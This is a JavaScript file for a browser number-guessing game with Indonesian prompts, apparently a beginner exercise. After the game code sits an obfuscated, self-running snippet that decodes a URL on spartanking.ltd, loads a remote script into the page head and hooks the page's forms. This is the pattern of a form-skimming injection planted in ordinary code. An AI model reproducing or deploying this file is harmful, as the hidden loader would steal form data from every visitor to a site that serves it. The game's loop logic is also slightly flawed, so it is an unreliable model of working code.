// variabel to repeat
var repeat = true;
while (repeat) {
  // guess chance variable declaration
  var live;
  // capture player choice
  alert("Tebak angka dari 1 - 10\nKamu Punya 3 Kesempatan!");
  var player = parseInt(prompt("Masukkan angka tebakan"));
  // make ramdom computer choice 1 - 10
  function random(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
  }
  var computer = random(1, 10);
  // determine the rules
  // variable to determine the result
  var result = "";
  // repetition of answers for players up to 3 times
  for (live = 2; live > 0; live--) {
    if (player == computer) {
      result = "Anda Benar!";
      // code to display the result
      alert("Tebakan " + result + "\nAngka yang dicari adalah " + computer);
    } else if (player < computer) {
      result = "Anda terlalu RENDAH!";
      // warns the number of remaining player chances and catches another guess option
      player = parseInt(prompt("Tebakan " + result + "\nKesempatan Anda Masih " + live + " Lagi"));
    } else {
      result = "Anda terlalu TINGGI!";
      // warns the number of remaining player chances and catches another guess option
      player = parseInt(prompt("Tebakan " + result + "\nKesempatan Anda Masih " + live + " Lagi"));
    }
  }
  // alert the opportunity is up and the player loses
  if (live == 0 && player != computer) {
    alert("Kesempatan Anda sudah habis! \nAngka yang dicari adalah " + computer);
  }
  // code to repeat the game
  repeat = confirm("Mau Bermain Lagi?");
}
// message after exiting the game
alert("Terima Kasih Sudah Bermain!");

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b